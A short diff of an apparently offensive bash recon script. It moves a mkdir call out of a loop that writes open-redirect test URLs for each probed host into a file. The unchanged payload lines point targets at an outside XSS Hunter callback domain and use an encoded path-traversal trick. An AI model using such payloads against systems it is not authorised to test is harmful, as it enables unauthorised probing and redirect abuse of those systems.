@@ -37,10 +37,9 @@ ls ; wc -l $input
 input=httprobe.txt ; export input=httprobe.txt
 
 i=1
+mkdir /root/script/3_httprobe/dir_$i
 for line in `cat $input`
 do
-
-mkdir /root/script/3_httprobe/dir_$i
 
 echo "${line}//xsshunternihao.xss.ht/%2f%2e%2e" |tee -a /root/script/3_httprobe/dir_$i/red.txt
 echo "${line}/http://xsshunternihao.xss.ht" |tee -a /root/script/3_httprobe/dir_$i/red.txt
